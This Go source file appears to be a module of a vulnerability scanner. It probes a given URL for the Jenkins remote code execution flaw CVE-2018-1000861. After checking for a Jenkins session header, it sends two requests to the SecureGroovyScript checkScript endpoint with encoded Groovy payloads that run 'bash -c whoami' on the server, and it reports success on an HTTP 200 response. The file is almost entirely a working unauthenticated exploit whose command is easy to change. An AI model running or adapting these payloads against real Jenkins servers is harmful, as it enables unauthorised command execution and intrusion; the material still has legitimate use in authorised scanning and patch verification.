package jenkins

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

func CVE_2018_1000861(u string) bool {
	if req, err := pkg.HttpRequset(u, "GET", "", false, nil); err == nil {
		if req.Header.Get("X-Jenkins-Session") != "" {
			if req2, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22bash+-c+whoami%22)%7d)%0aclass+Person%7b%7d", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 {
					fmt.Printf("jenkins-exp-sucess|CVE_2018_1000861|%s\n", u)
					return true
				}
			}
			if req3, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22bash+-cwhoami%22.execute().text+%7d)%0aclass+Person%7b%7d", "GET", "", false, nil); err == nil {
				if req3.StatusCode == 200 {
					fmt.Printf("jenkins-exp-sucess|CVE_2018_1000861|%s\n", u)
					return true
				}
			}
		}
	}
	return false
}
